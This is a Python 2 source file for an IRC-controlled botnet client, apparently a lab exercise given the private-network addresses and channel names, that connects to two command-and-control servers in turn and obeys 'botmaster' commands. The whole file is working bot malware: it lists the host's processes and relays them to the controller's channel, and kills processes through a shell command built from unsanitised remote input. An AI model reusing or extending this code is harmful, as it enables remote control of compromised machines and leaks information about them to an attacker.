import socket
import string
import subprocess
import time
import threading

# Init()

PORT = 6667
NICK = "botx"
IDENT = "bot"
REALNAME = "bot"
readbuffer = ""
listchan = ['#uitbotA', '#uitbotB']     # list channel for sv1 and sv2
channel = ""
sv = ["192.168.227.138", "192.168.227.139"] # list server
HOST = ""

s = socket.socket()
cmdq = False

def Init(HOST):
	global s
	s = None
	s = socket.socket()
	try:
		s.connect((HOST, PORT))
		s.send("NICK %s\r\n" % NICK)
		s.send("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME))
	except Exception as e:
		print "[-] Cannot connect to server"
		return False
	else:
		return True


def endConnection():
	#global s
	try:
		s.shutdown(0)
		s.close()
		print '[+] Connection closed\r\n'
	except:
		return


def sendROOM(data):  # Gui tin nhan vao channel
	s.send("PRIVMSG " + channel + " :" + data + "\r\n")


def cmdKP(pid):  # Kill process by pid
	#str = subprocess.Popen("WMIC PROCESS " + pid + " delete", \
	str = subprocess.Popen('kill -15 ' + pid, \
						   shell=True, stdout=subprocess.PIPE).stdout.read()
	str = str.split('\n')
	for line in str:
		sendROOM(line)


def cmdSPL():  # Show process list
	#str = subprocess.Popen("WMIC PROCESS get Caption,Processid", \
	str = subprocess.Popen('ps -A -o pid,pgrp,session,cmd', \
						   shell=True, stdout=subprocess.PIPE).stdout.read()
	str = str.split('\n')
	for line in str:
		sendROOM(line)
		time.sleep(1)
	sendROOM("---------------DONE---------------")


def cmdQUIT():
	global cmdq
	cmdq = True
	s.send("QUIT\r\n")


def checkPING(data):  # Kiem tra PING
	readbuffer = ""
	temp = string.split(data, '\r\n')
	readbuffer = temp.pop()
	for line in temp:
		line = string.rstrip(line)
		line = string.split(line)
		if (line[0] == "PING"):
			s.send("PONG %s\r\n" % line[1])


def handleCMD(data):  # Xu li lenh tu botmaster
	line = string.rstrip(data)
	line = string.split(line)
	try:
		s = line[4]
		if line[3] == (":!" + NICK) or line[3] == ":!ALL":
			if (s == "SHOWPL"):
				cmdSPL()
			if (s == "KILLP"):
				cmdKP(line[5])
			if (s == 'HI'):
				sendROOM('HELLO')
			if (s == "QUIT"):
				cmdQUIT()
			return
	except:
		return


def checkTime(t):
	print 'TTL = ' + str(t)
	thr = threading.currentThread()
	i = 0
	for i in range(0, t):
		time.sleep(1)
		if getattr(thr, 'running', True):
			break
	if i == (t - 1):
		s.send("QUIT\r\n")

def start(host, runtime, cn):
	HOST = host
	global cmdq
	global channel
	cmdq = False
	channel = listchan[cn]
	print 'Chanel: ' + channel
	if Init(HOST) is False:
		print "Exiting..."
		return False
	thTime = threading.Thread(target=checkTime, args=(runtime, ))
	thTime.start()
	thTime.running = False
	while 1:
		readbuffer = s.recv(1024)
		if ((len(readbuffer) < 1) or (readbuffer.find('Closing Link') != -1)):
			thTime.running = True
			break
		if (readbuffer.find("001 " + NICK) != -1):
			s.send("JOIN " + channel + "\r\n")
			sendROOM("+ " + NICK + " Connected...")
		checkPING(readbuffer)  # Kiem tra PING
		handleCMD(readbuffer)  # Xu li lenh
	thTime.join()
	endConnection()
	if cmdq == True:
		return False
	return True


def main():
	t = time.strftime("%X")
	print 'Time: ' + t
	t = t.split(':')
	h = int(t[0])
	m = 59 - int(t[1])
	s = 59 - int(t[2])
	c = 0
	rtime = s
	runsv = ''
	if h < 12:
		rtime += (11 - h) * 360 + (m * 60)
		runsv = sv[0]
		c = 0
	else:
		rtime += (23 - h) * 360 + (m * 60)
		runsv = sv[1]
		c = 1
	print '[+] Connecting to C&C server: ' + runsv
	rtime = 20
	while (start(runsv, rtime, c) == True):
		if runsv == sv[0]:
			runsv = sv[1]
			c = 1
		else:
			runsv = sv[0]
			c = 0
		print '[+] Switch to C&C server: ' + runsv
		rtime = 20       # Time in 12 hours (43200 seconds)

	print '---Finished....'

if __name__ == '__main__':
	main()
